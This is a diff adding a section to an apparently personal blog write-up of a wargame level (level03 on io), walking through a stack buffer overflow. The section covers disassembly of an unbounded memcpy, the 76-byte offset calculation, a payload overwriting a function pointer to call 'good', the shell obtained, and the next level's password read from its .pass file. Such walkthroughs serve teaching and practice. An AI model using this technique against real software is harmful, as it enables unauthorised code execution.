@@ -106,6 +106,49 @@ IFd92yzOnSMv9tkX
 
 <hr>
 
+<p>This one was a stack vulnerability in it&#39;s purest form.</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">.text:08048510 call    _strlen
+.text:08048515 mov     [esp+8], eax                    ; size of argv[1]
+.text:08048519 mov     eax, [ebp+arg_4]
+.text:0804851C add     eax, 4
+.text:0804851F mov     eax, [eax]
+.text:08048521 mov     [esp+4], eax                    ; argv[1] adress
+.text:08048525 lea     eax, [ebp+dest]                 ; destination buffer
+.text:08048528 mov     [esp], eax
+.text:0804852B call    _memcpy                         ; theres no limitation of the input argument size
+</code></pre></div>
+<p>Obviously we can write an arbitrary amount of data into the input buffer.
+The stack layout:</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">.text:080484C8 var_5C          = dword ptr -5Ch
+.text:080484C8 dest            = byte ptr -58h
+.text:080484C8 var_C           = dword ptr -0Ch
+.text:080484C8 arg_0           = dword ptr  8
+.text:080484C8 arg_4           = dword ptr  0Ch
+</code></pre></div>
+<p>Var_C is later called, normally holding the adress to the function called bad.
+We want to overwrite it with the adress to the function called good :)</p>
+<div class="highlight"><pre><code class="language-text" data-lang="text">.text:0804856D mov     eax, [ebp+var_C]
+.text:08048570 call    eax
+</code></pre></div>
+<p>So how big is the offset?
+58h-0C=4C which is 76 byte.
+Lets verify it.</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">76</span><span class="o">+</span><span class="s">&quot;BBBB&quot;</span>
+<span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</span>
+</code></pre></div>
+<p><img src="/images/EAXLevel3.png" alt="EAXOwned"></p>
+
+<p>Awesome!</p>
+
+<p>Adress of good: 0x08048474</p>
+
+<p>So our exploit will be:</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">print</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">76</span><span class="o">+</span>\<span class="n">x74</span>\<span class="n">x84</span>\<span class="n">x04</span>\<span class="n">x08</span><span class="s">&quot;</span>
+</code></pre></div><div class="highlight"><pre><code class="language-text" data-lang="text">level3@io:/levels$ ./level03 $(python -c &quot;print \&quot;A\&quot;*76+\&quot;\x74\x84\x04\x08\&quot;&quot;)
+This is exciting we&#39;re going to 0x8048474 Win.
+sh-4.2$ cat /home/level4/.pass
+nSwmULj2LpDnRGU2
+</code></pre></div>
 <h2>Level04</h2>
 
 <hr>
